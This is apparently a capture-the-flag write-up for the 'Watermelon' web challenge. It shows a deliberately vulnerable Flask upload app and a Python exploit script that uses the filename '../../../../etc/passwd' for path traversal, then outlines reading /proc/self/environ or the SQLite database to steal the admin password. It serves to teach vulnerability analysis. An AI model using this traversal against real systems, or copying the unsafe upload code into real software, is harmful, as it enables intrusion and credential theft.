# Web/Watermelon

## Description

All love for Watermelons ???

Attachments: [watermelon-player.zip](./watermelon-player.zip)

## Challenge Overview

In this challenge we were given a Flask application that allows users to upload their files.

app.py

```py
from flask import Flask, request, jsonify, session, send_file
from functools import wraps
from flask_sqlalchemy import SQLAlchemy
import os, secrets
from werkzeug.utils import secure_filename



app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///db.db' 
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
app.config['SECRET_KEY'] = secrets.token_hex(20)
app.config['UPLOAD_FOLDER'] = 'files'


db = SQLAlchemy(app)

class User(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(80), unique=True, nullable=False)
    password = db.Column(db.String(120), nullable=False)

class File(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    filename = db.Column(db.String(255), nullable=False)
    filepath = db.Column(db.String(255), nullable=False)
    uploaded_at = db.Column(db.DateTime, nullable=False, default=db.func.current_timestamp())
    user_id = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=False)

    user = db.relationship('User', backref=db.backref('files', lazy=True))


def create_admin_user():
    admin_user = User.query.filter_by(username='admin').first()
    if not admin_user:
        admin_user = User(username='admin', password= secrets.token_hex(20))
        db.session.add(admin_user)
        db.session.commit()
        print("Admin user created.")
    else:
        print("Admin user already exists.")

with app.app_context():
    db.create_all()
    create_admin_user()

def login_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'username' not in session or 'user_id' not in session:
            return jsonify({"Error": "Unauthorized access"}), 401
        return f(*args, **kwargs)
    return decorated_function


def admin_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'username' not in session or 'user_id' not in session or not session['username']=='admin':
            return jsonify({"Error": "Unauthorized access"}), 401
        return f(*args, **kwargs)
    return decorated_function

@app.route('/')
def index():
    return 'Welcome to my file sharing API'

@app.post("/register")
def register():
    if not request.json or not "username" in request.json or not "password" in request.json:
        return jsonify({"Error": "Please fill all fields"}), 400
    
    username = request.json['username']
    password = request.json['password']

    if User.query.filter_by(username=username).first():
        return jsonify({"Error": "Username already exists"}), 409

    new_user = User(username=username, password=password)
    db.session.add(new_user)
    db.session.commit()

    return jsonify({"Message": "User registered successfully"}), 201

@app.post("/login")
def login():
    if not request.json or not "username" in request.json or not "password" in request.json:
        return jsonify({"Error": "Please fill all fields"}), 400
    
    username = request.json['username']
    password = request.json['password']

    user = User.query.filter_by(username=username, password=password).first()
    if not user:
        return jsonify({"Error": "Invalid username or password"}), 401
    
    session['user_id'] = user.id
    session['username'] = user.username
    return jsonify({"Message": "Login successful"}), 200

@app.get('/profile')
@login_required
def profile():
    return jsonify({"username": session['username'], "user_id": session['user_id']})

@app.get('/files')
@login_required
def list_files():
    user_id = session.get('user_id')
    files = File.query.filter_by(user_id=user_id).all()
    file_list = [{"id": file.id, "filename": file.filename, "filepath": file.filepath, "uploaded_at": file.uploaded_at} for file in files]
    return jsonify({"files": file_list}), 200


@app.route("/upload", methods=["POST"])
@login_required
def upload_file():
    if 'file' not in request.files:
        return jsonify({"Error": "No file part"}), 400
    
    file = request.files['file']
    if file.filename == '':
        return jsonify({"Error": "No selected file"}), 400
    
    user_id = session.get('user_id')
    if file:
        blocked = ["proc", "self", "environ", "env"]
        filename = file.filename

        if filename in blocked:
            return jsonify({"Error":"Why?"})

        user_dir = os.path.join(app.config['UPLOAD_FOLDER'], str(user_id))
        os.makedirs(user_dir, exist_ok=True)
        

        file_path = os.path.join(user_dir, filename)

        print(f"{user_dir=}\n{filename=}\n{secure_filename(filename)=}")
        file.save(f"{user_dir}/{secure_filename(filename)}")
        

        new_file = File(filename=secure_filename(filename), filepath=file_path, user_id=user_id)
        db.session.add(new_file)
        db.session.commit()
        
        return jsonify({"Message": "File uploaded successfully", "file_path": file_path}), 201

    return jsonify({"Error": "File upload failed"}), 500

@app.route("/file/<int:file_id>", methods=["GET"])
@login_required  
def view_file(file_id):
    user_id = session.get('user_id')
    file = File.query.filter_by(id=file_id, user_id=user_id).first()

    if file is None:
        return jsonify({"Error": "File not found or unauthorized access"}), 404
    
    try:
        return send_file(file.filepath, as_attachment=True)
    except Exception as e:
        return jsonify({"Error": str(e)}), 500


@app.get('/admin')
@admin_required
def admin():
    return os.getenv("FLAG","BHFlagY{testing_flag}")



if __name__ == '__main__':
    app.run(host='0.0.0.0')
```

The function here that we can exploit is `upload_file` function. The flaw in this is that it never checks for `../` in the filename we provide and directly stores our given filename into `filepath` in the database.

```py
def upload_file():
        ...

        file_path = os.path.join(user_dir, filename)

        print(f"{user_dir=}\n{filename=}\n{secure_filename(filename)=}")
        file.save(f"{user_dir}/{secure_filename(filename)}")
        

        new_file = File(filename=secure_filename(filename), filepath=file_path, user_id=user_id)
        db.session.add(new_file)
        db.session.commit()

        ...
```

Thus, if we provide a filename like `../../../etc/passwd`, we should be able to read the `/etc/passwd` file, giving us an LFI vulnerability.
 
## Exploit

exploit.py

```py
import requests

BASE_URL = 'http://localhost:5000'

session = requests.Session()

def register(username, password):
    url = f"{BASE_URL}/register"
    payload = {'username': username, 'password': password}
    response = session.post(url, json=payload)
    print(f"Register: {response.status_code} - {response.json()}")

def login(username, password):
    url = f"{BASE_URL}/login"
    payload = {'username': username, 'password': password}
    response = session.post(url, json=payload)
    print(response.cookies)
    print(f"Login: {response.status_code} - {response.json()}")

def upload_file(file_path, new_filename=None):
    url = f"{BASE_URL}/upload"
    files = {'file': (new_filename if new_filename else file_path.split('/')[-1], open(file_path, 'rb'))}
    response = session.post(url, files=files)
    print(f"Upload: {response.status_code} - {response.json()}")

def list_files():
    url = f"{BASE_URL}/files"
    response = session.get(url)
    print(f"List Files: {response.status_code} - {response.json()}")

def view_file(file_id):
    url = f"{BASE_URL}/file/{file_id}"
    response = session.get(url)
    if response.status_code == 200:
        with open(f"downloaded_{file_id}.file", 'wb') as f:
            f.write(response.content)
        print(f"File {file_id} downloaded successfully.")
    else:
        print(f"View File: {response.status_code} - {response.json()}")

def admin_access():
    url = f"{BASE_URL}/admin"
    response = session.get(url)
    print(f"Admin Access: {response.status_code} - {response.text}")

if __name__ == "__main__":
    register('demo', 'demo')
    login('demo', 'demo')
    
    file_path = './demo.txt'
    new_filename = '../../../../etc/passwd'
    upload_file(file_path, new_filename)

    list_files()
    view_file(1)
```

Running the above script downloads the `/etc/passwd` file for us. Which means that our LFI was successful.

Now we simply had to get the flag from the environment variables. A simple solution would be to read the `/proc/self/environ` file which contains the environment variables but because the server is checking the `blocked` words in filename which prevents us from reading the `environ` file (although the way it is checking the `blocked` words is incorrect, when trying to read the `/environ` file it didn't work).

So a simple way to get the flag was to read the `sqlite` database (`/app/instance/db.db`) which would give us the `admin password` and then we can use that to login as admin and then navigate to `/admin` to get the flag.